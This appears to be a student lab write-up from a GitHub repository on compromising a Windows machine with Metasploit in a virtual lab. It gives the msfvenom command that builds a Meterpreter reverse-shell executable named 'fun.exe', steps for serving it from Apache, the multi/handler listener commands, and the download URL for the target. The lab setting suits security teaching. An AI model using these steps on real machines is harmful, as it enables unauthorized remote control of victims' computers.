# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:
Find the attackers ip address using ifconfig
## OUTPUT:

![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/a396596a-a2bc-4226-8930-59fb09c045c1)

Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15 -f exe > fun.exe

## OUTPUT:

![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/76b10ac2-3aff-43da-8766-741b1b86b498)

copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/10a1151b-14f4-4483-9658-1ad063807e90)

Start apache server
sudo systemctl apache2 start

![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/733de93e-f86b-420b-a790-d2543e4da0e0)

Check the status of apache2

![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/49c4488c-cba5-4c70-ba39-4d2ffc3dc180)

Invoke msfconsole:

## OUTPUT:

![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/6ad1cb9c-8f5d-4338-ada3-0a585816a72a)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/cb6a3c0c-9089-4d26-bf8c-361f1d21844c)

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

![image](https://github.com/Darkwebnew/Compromising-windows-using-Metasploit/assets/143114486/e89130b2-ed69-4b0c-9be1-dbf0b6c2b87f)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://10.0.2.15/fun.exe
The file "fun.exe" downloads. 


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
